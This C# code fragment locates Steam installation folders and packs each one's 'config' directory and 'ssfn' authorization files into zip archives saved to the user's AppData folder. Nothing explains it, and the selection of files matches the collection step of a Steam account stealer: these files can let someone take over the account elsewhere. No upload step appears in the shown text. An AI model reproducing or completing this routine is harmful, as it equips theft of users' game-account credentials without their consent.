                List<string> steamPathsNoNull = new List<string>();
                foreach (string s in steamPaths)
                {
                    if (s != "")
                    {
                        steamPathsNoNull.Add(s);
                    }
                }
                int i = 0;
                foreach (string s in steamPathsNoNull)
                {
                    string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    ZipFile zip = new ZipFile();
                    zip.AddFile(Path.Combine(s, "config"));
                    foreach (string f in Directory.GetFiles(s))
                    {
                        string fileName = Path.GetFileName(f);
                        if (fileName.StartsWith("ssfn"))
                        {
                            zip.AddFile(Path.Combine(s, fileName));
                        }
                    }
                    zip.Save(Path.Combine(appData, "Steam[" + i + "].zip"));
                    i++;
                }
